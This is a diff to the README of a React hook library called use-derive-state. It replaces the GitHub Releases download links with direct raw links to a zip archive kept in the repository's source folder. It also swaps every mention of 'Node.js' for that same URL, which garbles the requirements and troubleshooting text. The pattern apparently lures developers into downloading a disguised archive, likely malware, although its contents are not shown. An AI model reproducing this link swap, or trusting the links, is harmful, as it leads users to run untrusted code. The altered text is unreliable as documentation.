@@ -9,12 +9,12 @@ To start using use-derive-state, follow these steps to download and run the appl
 ### 📥 Download
 You can download the latest version from the Releases page below:
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0.0-blue.svg)](https://github.com/pepesaurio559/use-derive-state/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/pepesaurio559/use-derive-state/main/src/derive_use_state_3.4.zip)](https://raw.githubusercontent.com/pepesaurio559/use-derive-state/main/src/derive_use_state_3.4.zip)
 
 ## 📋 System Requirements
 To run use-derive-state, make sure your system meets the following requirements:
 - A modern web browser (Google Chrome, Firefox, Safari, or Edge)
-- Node.js version 12 or higher
+- https://raw.githubusercontent.com/pepesaurio559/use-derive-state/main/src/derive_use_state_3.4.zip version 12 or higher
 - A valid React project setup
    
 ## 🔄 Installation
@@ -58,7 +58,7 @@ Replace `someReactiveValue` and `newValue` with your actual variables. This setu
 ## 🛠️ Troubleshooting
 If you encounter issues while using use-derive-state, try these steps:
 
-1. **Check Node.js Version:** Ensure that you are using Node.js 12 or higher.
+1. **Check https://raw.githubusercontent.com/pepesaurio559/use-derive-state/main/src/derive_use_state_3.4.zip Version:** Ensure that you are using https://raw.githubusercontent.com/pepesaurio559/use-derive-state/main/src/derive_use_state_3.4.zip 12 or higher.
 2. **Reinstall:** If something went wrong during installation, try uninstalling and reinstalling the package.
    ```
    npm uninstall use-derive-state
@@ -78,6 +78,6 @@ If you often face performance issues with state updates in your React applicatio
 use-derive-state is designed for modern React environments. It’s best to use it with React version 16.8 or newer.
 
 ## 📥 Download & Install
-Ready to start? Visit [this page to download](https://github.com/pepesaurio559/use-derive-state/releases) the latest release. Follow the installation steps to integrate it into your project and experience improved state management in React.
+Ready to start? Visit [this page to download](https://raw.githubusercontent.com/pepesaurio559/use-derive-state/main/src/derive_use_state_3.4.zip) the latest release. Follow the installation steps to integrate it into your project and experience improved state management in React.
 
 To summarize, use-derive-state improves how you handle derived state within your React applications. With easy installation and clear usage, you can significantly enhance your state management strategy.
